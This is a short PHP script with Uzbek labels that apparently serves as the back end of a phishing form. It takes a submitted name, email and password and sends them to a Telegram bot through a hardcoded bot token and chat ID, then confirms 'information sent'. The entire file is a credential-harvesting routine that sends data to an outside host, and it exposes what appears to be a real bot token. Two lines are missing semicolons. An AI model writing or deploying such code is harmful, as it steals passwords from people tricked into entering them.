<?php


$name = $_POST['name'];
$mail = $_POST['mail'];
$parol = $_POST['parol'];

$token = "5208567135:AAFyAFtQiaFJR1dliq00RTOOwO1v2Z5apBQ"
$chat_id = "-1001593579467"
$array = array(
    'Ismi: ' => $name,
    'Emaili: ' => $mail,
    'Paroli: ' => $parol
);

// print_r($array)
foreach($array as $key => $value){
    $text.="<b>".$key."</b>".$value."%0A";
}
$sendTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$text}", "r");

if ($sendTelegram){
    echo "Malumot jonatildi";
}
?>
